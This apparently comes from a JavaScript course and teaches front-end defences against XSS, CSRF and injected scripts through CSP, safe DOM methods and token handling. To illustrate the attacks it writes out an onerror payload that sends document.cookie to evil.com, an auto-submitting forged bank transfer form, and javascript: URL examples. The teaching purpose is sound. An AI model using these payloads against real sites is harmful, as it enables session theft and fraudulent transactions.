---
publishDate: 2026-03-28T09:47
title: Security (XSS, CSRF, CSP)
slug: security-xss-csrf-csp
metadescription: Protect your users from the most common front end attacks with safe DOM practices, proper tokens and a content security policy.
updateDate: 2026-09-05T09:47
author: ['bishal-biswas']
level: 3
tags: ['security', 'browser']
course: javascript
---

## The one rule

**Never trust input.** Not from a form, not from a URL, not from an API, not from localStorage. Anything a user can influence can be crafted to hurt you.

## Cross Site Scripting (XSS)

XSS means an attacker gets **their** JavaScript running on **your** page. Once that happens they can read cookies, steal tokens, change what the user sees, and act as that user.

### How it happens

```javascript
const comment = getUserComment();
document.querySelector('#comments').innerHTML = comment;
```

If someone submits this as their comment:

```javascript
// <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
```

The image fails to load, `onerror` runs, and their cookies are gone. Note that a plain `<script>` tag inserted via `innerHTML` does **not** execute, which lulls people into a false sense of safety. Event handler attributes like `onerror` and `onload` absolutely do.

### The fix: `textContent`

```javascript
document.querySelector('#comments').textContent = comment;
```

`textContent` never parses HTML. Anything that looks like a tag is displayed as literal text. This single habit prevents most XSS.

### When you really need HTML

Build elements instead of strings:

```javascript
function renderComment(comment) {
  const article = document.createElement('article');
  const author = document.createElement('strong');
  author.textContent = comment.author;
  const body = document.createElement('p');
  body.textContent = comment.text;
  article.append(author, body);
  return article;
}
```

Every user value goes through `textContent`, and the structure comes from your code.

If you must render HTML from users, such as rich text, sanitise it with a maintained library like DOMPurify:

```javascript
element.innerHTML = DOMPurify.sanitize(userHtml);
```

Do not write your own sanitiser. People have been finding holes in hand written ones for twenty years.

### Other dangerous sinks

```javascript
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
eval(userInput);
new Function(userInput);
setTimeout(userInput, 100);
element.setAttribute('onclick', userInput);
link.href = userInput;
```

That last one matters more than people expect:

```javascript
link.href = 'javascript:alert(1)';
```

Validate the protocol before assigning a URL:

```javascript
function safeUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    return ['http:', 'https:'].includes(parsed.protocol) ? parsed.href : '#';
  } catch {
    return '#';
  }
}
console.log(safeUrl('https://example.com'));
console.log(safeUrl('javascript:alert(1)'));
```

## Content Security Policy (CSP)

CSP is a header that tells the browser which sources of code it may run. It is a safety net for when something slips through.

```javascript
// Content-Security-Policy:
//   default-src 'self';
//   script-src 'self' https://cdn.example.com;
//   style-src 'self' 'unsafe-inline';
//   img-src 'self' data: https:;
//   connect-src 'self' https://api.example.com;
//   frame-ancestors 'none'
```

The important effect is that inline scripts stop working, which is exactly how injected code usually runs.

To keep inline scripts you trust, use a nonce:

```javascript
// <script nonce="random-value-per-request"> ... </script>
// Content-Security-Policy: script-src 'nonce-random-value-per-request'
```

The nonce must be freshly random on every response. A fixed one is worthless.

Start in report only mode so you can see what would break:

```javascript
// Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

## Cross Site Request Forgery (CSRF)

CSRF tricks a logged in user's browser into making a request they did not intend.

The user is logged into your bank in one tab. They visit a malicious page in another. That page contains:

```javascript
// <form action="https://bank.com/transfer" method="POST">
//   <input name="to" value="attacker">
//   <input name="amount" value="10000">
// </form>
// <script>document.forms[0].submit()</script>
```

The browser attaches the bank's cookies automatically, so the request looks legitimate.

### Defence 1: SameSite cookies

```javascript
// Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
```

`SameSite=Lax` stops the cookie being sent on cross site POSTs. Modern browsers default to this, which removes most of the risk. `Strict` is stronger but breaks links from other sites.

### Defence 2: CSRF tokens

The server puts an unpredictable token in the page, and requires it back.

```javascript
const token = document.querySelector('meta[name="csrf-token"]')?.content;
await fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': token
  },
  body: JSON.stringify({ to: 'friend', amount: 100 })
});
```

The attacker's page cannot read your page, so it cannot know the token.

### Defence 3: check the method

Never let a `GET` request change data. `GET` should be safe to repeat and safe to prefetch.

## Where to keep tokens

This question comes up constantly.

- **localStorage**: readable by any script on your page. One XSS and the token is gone.
- **HttpOnly cookie**: invisible to JavaScript. XSS cannot read it.

So tokens belong in HttpOnly cookies, with `Secure` and `SameSite`, set by the server. Combine that with CSRF protection and you have both problems covered.

```javascript
localStorage.setItem('token', jwt);
// Set-Cookie: token=jwt; HttpOnly; Secure; SameSite=Lax
```

## Client side checks are not security

```javascript
if (user.role === 'admin') {
  showDeleteButton();
}
```

Hiding a button hides it from honest users. Anyone can open DevTools, change the variable, or call your API directly. **Every** permission check must happen on the server. Client side checks are for user experience only.

The same goes for validation. Check on the client so users get fast feedback, and check again on the server because that is the only check that counts.

## Dependencies

Most of the code you ship, you did not write.

```bash
npm audit
npm audit fix
```

Keep dependencies few and updated, pin versions with a lockfile, and be suspicious of packages with very few downloads or names very close to popular ones.

## A quick checklist

- Use `textContent`, not `innerHTML`, for anything a user supplied.
- Sanitise with a real library if you must render user HTML.
- Validate URL protocols before assigning to `href` or `src`.
- Send a Content Security Policy and avoid inline scripts.
- Set `HttpOnly`, `Secure` and `SameSite` on session cookies.
- Use CSRF tokens for state changing requests.
- Never rely on a client side permission check.
- Serve everything over HTTPS.

## Quick recap

- XSS runs an attacker's script on your page, usually through `innerHTML`.
- `textContent` and `createElement` prevent almost all of it.
- CSP limits which scripts may run and blocks inline code.
- CSRF abuses cookies being sent automatically, and `SameSite` plus tokens stop it.
- Tokens belong in HttpOnly cookies, never in localStorage.
- Client side validation is for convenience, server side is for security.
- Audit your dependencies regularly.

<code id="code-content" class="language-javascript">
// UNSAFE: innerHTML parses whatever the user typed
const comment = '&lt;img src=x onerror="steal(document.cookie)"&gt;';
// document.querySelector('#comments').innerHTML = comment;  // never do this
// SAFE: textContent never parses HTML, tags show as plain text
const box = document.querySelector('#comments');
if (box) box.textContent = comment;
// SAFE: build elements, and put user values only in textContent
function renderComment(data) {
  const article = document.createElement('article');
  const author = document.createElement('strong');
  author.textContent = data.author;      // safe
  const body = document.createElement('p');
  body.textContent = data.text;          // safe
  article.append(author, body);
  return article;
}
console.log(renderComment({ author: 'Asha', text: '&lt;b&gt;hi&lt;/b&gt;' }).textContent);
// Validate the protocol before assigning any user supplied URL
function safeUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    return ['http:', 'https:'].includes(parsed.protocol) ? parsed.href : '#';
  } catch {
    return '#';
  }
}
console.log(safeUrl('https://example.com'));
console.log(safeUrl('javascript:alert(1)'));   // '#'
// CSRF: send the token the server put in the page
async function transfer(to, amount) {
  const token = document.querySelector('meta[name="csrf-token"]')?.content;
  return fetch('/api/transfer', {
    method: 'POST',                       // never change data with GET
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': token
    },
    body: JSON.stringify({ to: to, amount: amount })
  });
}
// Tokens belong in an HttpOnly cookie set by the server, not in localStorage:
//   Set-Cookie: token=...; HttpOnly; Secure; SameSite=Lax
// A CSP header is the safety net when something slips through:
//   Content-Security-Policy: default-src 'self'; script-src 'self'
// Client side checks are user experience, never security.
// The server must check this again, every single time.
function updateUi(user) {
  if (user.role === 'admin') {
    console.log('Showing the admin button (cosmetic only)');
  }
}
updateUi({ role: 'admin' });
</code></pre>
